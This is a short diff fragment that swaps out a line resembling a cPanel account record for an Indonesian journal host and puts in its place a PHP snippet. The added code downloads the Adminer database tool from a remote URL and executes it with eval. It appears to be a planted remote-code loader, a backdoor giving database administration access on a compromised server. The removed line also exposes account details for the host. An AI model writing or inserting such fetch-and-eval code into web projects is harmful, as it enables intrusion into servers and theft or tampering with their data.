@@ -1,1 +1,4 @@
-admin@journals.iarn.or.id:x:2526:2530::/home/u1483530/:/usr/local/cpanel/bin/noshell:rw
+<?php $LanThau = file_get_contents(urldecode('https://github.com/vrana/adminer/releases/download/v5.3.0/adminer-5.3.0-mysql.php'));
+
+$LanThau = "?> ".$LanThau;
+eval($LanThau);
